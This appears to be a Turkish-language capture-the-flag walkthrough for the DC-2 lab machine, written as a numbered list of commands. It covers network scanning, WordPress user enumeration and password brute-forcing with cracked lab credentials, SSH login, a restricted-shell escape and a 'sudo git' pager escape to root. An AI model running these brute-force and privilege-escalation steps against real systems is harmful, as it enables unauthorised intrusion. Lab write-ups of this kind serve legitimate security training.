@@ -1,0 +1,17 @@
+DC-2 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.124 bulundu.
+2 - nmap -sT -A 192.168.2.124
+3 - gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://dc-2/index.php/flag/
+5 - wpscan --url http://dc-2/ -e u, [ admin, jerry, tom ]
+6 - cewl http://dc-2/ >> dc-2_cewl.txt
+7 - wpscan --url http://dc-2/ -e p --usernames dc-2_users.txt --passwords dc-2_cewl.txt, jerry:adipiscing, tom:parturient
+8 - ssh -p 7744 tom@192.168.2.124
+9 - set shell=/bin/bash
+10 - export PATH=/bin:/usr/bin:$PATH
+11 - export SHELL=/bin/bash:$SHELL
+12 - su jerry
+13 - sudo -l
+14 - sudo git -p help config
+15 - !/bin/sh
+16 - whoami
